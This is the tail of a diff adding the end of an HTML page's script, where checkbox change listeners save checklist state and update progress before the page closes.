+    boxes.forEach(function(b){
+      b.addEventListener('change', function(){ saveChk(); updateChkProgress(); });
+    });
+    loadChk();
+  })();
+
+  // checklist links force their target section into view and stay native-anchor simple (no details to open here)
+</script>
+
+</body><!-- end — sinogear -->
+</html>
